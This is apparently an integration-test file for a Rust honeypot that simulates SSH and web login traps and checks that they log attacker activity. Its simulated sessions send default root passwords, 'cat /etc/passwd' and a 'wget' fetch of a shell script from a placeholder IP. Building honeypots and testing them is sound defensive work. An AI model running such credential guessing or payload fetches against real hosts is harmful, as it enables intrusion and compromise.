//! End to end tests: a real session against the real traps, on an ephemeral loopback port.

use honeypot::log::EventLog;
use honeypot::trap;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::path::PathBuf;
use std::sync::Arc;
use std::time::Duration;

fn temp_log(name: &str) -> PathBuf {
    let path = std::env::temp_dir().join(name);
    let _ = std::fs::remove_file(&path);
    path
}

fn read_until(stream: &mut TcpStream, buffer: &mut String, marker: &str) -> String {
    let deadline = std::time::Instant::now() + Duration::from_secs(5);
    loop {
        if let Some(index) = buffer.find(marker) {
            let text: String = buffer.drain(..index + marker.len()).collect();
            return text;
        }
        if std::time::Instant::now() > deadline {
            panic!("no apareció la marca {marker} a tiempo");
        }
        let mut chunk = [0u8; 1024];
        match stream.read(&mut chunk) {
            Ok(0) => panic!("la conexión se cerró antes de {marker}"),
            Ok(count) => buffer.push_str(&String::from_utf8_lossy(&chunk[..count])),
            Err(error) => panic!("fallo de lectura esperando {marker}: {error}"),
        }
    }
}

#[test]
fn ssh_trap_records_the_whole_session() {
    let log_path = temp_log("honeypot-it-ssh.jsonl");
    let log = Arc::new(EventLog::open(&log_path).expect("no se pudo abrir el registro"));
    let address = trap::start_ssh_trap("127.0.0.1:0".parse().unwrap(), Arc::clone(&log))
        .expect("no se pudo abrir la trampa SSH");

    let mut stream = TcpStream::connect(address).expect("no se pudo conectar");
    stream
        .set_read_timeout(Some(Duration::from_secs(5)))
        .unwrap();
    let mut buffer = String::new();

    let banner = read_until(&mut stream, &mut buffer, "\n");
    assert!(
        banner.contains("SSH-2.0-OpenSSH"),
        "banner inesperado: {banner}"
    );

    // Two denied attempts and one accepted: the trap lets the attacker in to observe it.
    for password in ["123456", "admin"] {
        read_until(&mut stream, &mut buffer, "login: ");
        stream.write_all(b"root\n").unwrap();
        read_until(&mut stream, &mut buffer, "Password: ");
        stream
            .write_all(format!("{password}\n").as_bytes())
            .unwrap();
        let denial = read_until(&mut stream, &mut buffer, "Permission denied");
        assert!(denial.contains("Permission denied"), "respuesta: {denial}");
    }

    read_until(&mut stream, &mut buffer, "login: ");
    stream.write_all(b"root\n").unwrap();
    read_until(&mut stream, &mut buffer, "Password: ");
    stream.write_all(b"toor\n").unwrap();
    let welcome = read_until(&mut stream, &mut buffer, "root@victima:~# ");
    assert!(welcome.contains("Welcome"), "respuesta: {welcome}");

    stream.write_all(b"uname -a\n").unwrap();
    let answer = read_until(&mut stream, &mut buffer, "root@victima:~# ");
    assert!(answer.contains("Linux victima"), "respuesta: {answer}");

    stream
        .write_all(b"wget http://198.51.100.7/x.sh\n")
        .unwrap();
    read_until(&mut stream, &mut buffer, "root@victima:~# ");

    stream.write_all(b"exit\n").unwrap();
    let mut rest = String::new();
    let _ = stream.read_to_string(&mut rest);

    // Give the trap a moment to write the closing event.
    std::thread::sleep(Duration::from_millis(200));

    let content = std::fs::read_to_string(&log_path).expect("no se pudo leer el registro");
    assert!(content.contains("\"event\":\"connect\""));
    assert!(content.contains("\"event\":\"login_attempt\""));
    assert!(content.contains("\"result\":\"denied\""));
    assert!(content.contains("\"result\":\"accepted\""));
    assert!(content.contains("\"event\":\"login_accepted\""));
    assert!(content.contains("\"event\":\"command\""));
    assert!(content.contains("\"command\":\"uname -a\""));
    assert!(content.contains("\"event\":\"download_attempt\""));
    assert!(content.contains("\"event\":\"session_end\""));

    let _ = std::fs::remove_file(&log_path);
}

#[test]
fn http_trap_records_the_credentials_it_receives() {
    let log_path = temp_log("honeypot-it-http.jsonl");
    let log = Arc::new(EventLog::open(&log_path).expect("no se pudo abrir el registro"));
    let address = trap::start_http_trap("127.0.0.1:0".parse().unwrap(), Arc::clone(&log))
        .expect("no se pudo abrir la trampa web");

    let mut stream = TcpStream::connect(address).expect("no se pudo conectar");
    stream
        .write_all(b"GET / HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n")
        .unwrap();
    let mut page = String::new();
    stream.read_to_string(&mut page).unwrap();
    assert!(page.starts_with("HTTP/1.1 200 OK"), "respuesta: {page}");
    assert!(page.contains("<form"), "falta el formulario: {page}");

    let mut stream = TcpStream::connect(address).expect("no se pudo conectar");
    let body = "user=admin&password=clave-de-prueba";
    stream
        .write_all(
            format!(
                "POST /login HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
                body.len()
            )
            .as_bytes(),
        )
        .unwrap();
    let mut answer = String::new();
    stream.read_to_string(&mut answer).unwrap();
    assert!(answer.contains("Sesión iniciada"), "respuesta: {answer}");

    std::thread::sleep(Duration::from_millis(200));
    let content = std::fs::read_to_string(&log_path).expect("no se pudo leer el registro");
    assert!(content.contains("\"event\":\"http_get\""));
    assert!(content.contains("\"event\":\"http_post\""));
    assert!(content.contains("\"user\":\"admin\""));
    assert!(content.contains("\"password\":\"clave-de-prueba\""));

    let _ = std::fs::remove_file(&log_path);
}

#[test]
fn the_scripted_attack_pairs_every_command_with_its_answer() {
    let log_path = temp_log("honeypot-it-attack.jsonl");
    let log = Arc::new(EventLog::open(&log_path).expect("no se pudo abrir el registro"));
    let address = trap::start_ssh_trap("127.0.0.1:0".parse().unwrap(), Arc::clone(&log))
        .expect("no se pudo abrir la trampa SSH");

    let outcome = honeypot::attack::run(
        &address.to_string(),
        &["123456", "admin", "toor"],
        Duration::from_secs(5),
    )
    .expect("el ataque simulado falló");

    assert_eq!(outcome.attempts.len(), 3);
    assert!(outcome.attempts[0].response.contains("Permission denied"));
    assert!(outcome.attempts[1].response.contains("Permission denied"));
    assert!(outcome.attempts[2].response.contains("Welcome"));

    let answer_of = |command: &str| {
        outcome
            .commands
            .iter()
            .find(|(sent, _)| sent == command)
            .map(|(_, response)| response.clone())
            .unwrap_or_else(|| panic!("falta la orden {command}"))
    };
    assert!(answer_of("uname -a").contains("Linux victima"));
    assert!(answer_of("whoami").contains("root"));
    assert!(answer_of("id").contains("uid=0(root)"));
    assert!(answer_of("cat /etc/passwd").contains("root:x:0:0"));

    // The transcript shows the answers, not the shell prompt of the fake host.
    for (_, response) in &outcome.commands {
        assert!(
            !response.contains("root@victima"),
            "la respuesta todavía trae el prompt: {response}"
        );
    }

    let _ = std::fs::remove_file(&log_path);
}

#[test]
fn unknown_path_is_answered_and_logged() {
    let log_path = temp_log("honeypot-it-404.jsonl");
    let log = Arc::new(EventLog::open(&log_path).expect("no se pudo abrir el registro"));
    let address = trap::start_http_trap("127.0.0.1:0".parse().unwrap(), Arc::clone(&log))
        .expect("no se pudo abrir la trampa web");

    let mut stream = TcpStream::connect(address).expect("no se pudo conectar");
    stream
        .write_all(b"GET /admin HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n")
        .unwrap();
    let mut answer = String::new();
    stream.read_to_string(&mut answer).unwrap();
    assert!(answer.starts_with("HTTP/1.1 404"), "respuesta: {answer}");

    std::thread::sleep(Duration::from_millis(200));
    let content = std::fs::read_to_string(&log_path).expect("no se pudo leer el registro");
    assert!(content.contains("\"status\":\"404\""));

    let _ = std::fs::remove_file(&log_path);
}

#[test]
fn el_tope_de_intentos_cierra_la_sesion_y_lo_anota() {
    let log_path = temp_log("honeypot-it-limite.jsonl");
    let log = Arc::new(EventLog::open(&log_path).expect("no se pudo abrir el registro"));
    let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("no se pudo escuchar");
    let address = listener.local_addr().expect("no se pudo leer la dirección");

    std::thread::spawn(move || {
        let (stream, _) = listener.accept().expect("no se pudo aceptar");
        // Tope de 2 intentos y 1 segundo: el tercer par de credenciales lo rebasa.
        honeypot::trap::serve_ssh_session_con_limites(
            stream,
            &log,
            "s-limite",
            2,
            Duration::from_secs(1),
        );
    });

    let mut stream = TcpStream::connect(address).expect("no se pudo conectar");
    stream
        .set_read_timeout(Some(Duration::from_secs(5)))
        .unwrap();
    let mut buffer = String::new();
    // Los dos primeros pares se rechazan; el tercero rebasa el tope de 2.
    for password in ["123456", "admin", "toor"] {
        read_until(&mut stream, &mut buffer, "login: ");
        stream.write_all(b"root\n").unwrap();
        read_until(&mut stream, &mut buffer, "Password: ");
        stream
            .write_all(format!("{password}\n").as_bytes())
            .unwrap();
    }

    let mut resto = String::new();
    let _ = stream.read_to_string(&mut resto);

    std::thread::sleep(Duration::from_millis(200));
    let content = std::fs::read_to_string(&log_path).expect("no se pudo leer el registro");
    assert!(
        content.contains("\"event\":\"limite_intentos\""),
        "debía anotarse el tope de intentos: {content}"
    );
    assert!(resto.contains("Too many authentication failures"));

    let _ = std::fs::remove_file(&log_path);
}

#[test]
fn la_sesion_se_cierra_sola_si_el_atacante_se_queda_callado() {
    let log_path = temp_log("honeypot-it-timeout.jsonl");
    let log = Arc::new(EventLog::open(&log_path).expect("no se pudo abrir el registro"));
    let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("no se pudo escuchar");
    let address = listener.local_addr().expect("no se pudo leer la dirección");

    std::thread::spawn(move || {
        let (stream, _) = listener.accept().expect("no se pudo aceptar");
        // Un segundo de silencio y la sesión se cierra.
        honeypot::trap::serve_ssh_session_con_limites(
            stream,
            &log,
            "s-timeout",
            2,
            Duration::from_secs(1),
        );
    });

    let mut stream = TcpStream::connect(address).expect("no se pudo conectar");
    let mut buffer = String::new();
    read_until(&mut stream, &mut buffer, "SSH-2.0");
    // No se envía nada: el atacante se queda callado.

    std::thread::sleep(Duration::from_millis(1500));
    let content = std::fs::read_to_string(&log_path).expect("no se pudo leer el registro");
    assert!(
        content.contains("\"event\":\"sesion_timeout\""),
        "debía anotarse el tiempo agotado: {content}"
    );

    let _ = std::fs::remove_file(&log_path);
}

#[test]
fn los_clics_en_la_web_falsa_quedan_registrados() {
    let log_path = temp_log("honeypot-it-clicks.jsonl");
    let log = Arc::new(EventLog::open(&log_path).expect("no se pudo abrir el registro"));
    let address = trap::start_http_trap("127.0.0.1:0".parse().unwrap(), Arc::clone(&log))
        .expect("no se pudo abrir la trampa web");

    // Primero se entra con las credenciales.
    let mut stream = TcpStream::connect(address).expect("no se pudo conectar");
    let cuerpo = "user=admin&password=clave";
    stream
        .write_all(
            format!(
                "POST /login HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{cuerpo}",
                cuerpo.len()
            )
            .as_bytes(),
        )
        .unwrap();
    let mut pagina = String::new();
    stream.read_to_string(&mut pagina).unwrap();
    assert!(
        pagina.contains("/cuenta"),
        "el panel debe ofrecer enlaces: {pagina}"
    );

    // Después el atacante "hace clic" en una de esas páginas.
    let mut stream = TcpStream::connect(address).expect("no se pudo conectar");
    stream
        .write_all(b"GET /transferencia HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n")
        .unwrap();
    let mut clic = String::new();
    stream.read_to_string(&mut clic).unwrap();
    assert!(clic.starts_with("HTTP/1.1 200"), "respuesta: {clic}");

    std::thread::sleep(Duration::from_millis(200));
    let content = std::fs::read_to_string(&log_path).expect("no se pudo leer el registro");
    assert!(
        content.contains("\"event\":\"http_click\""),
        "faltó el clic: {content}"
    );
    assert!(content.contains("\"path\":\"/transferencia\""));

    let _ = std::fs::remove_file(&log_path);
}
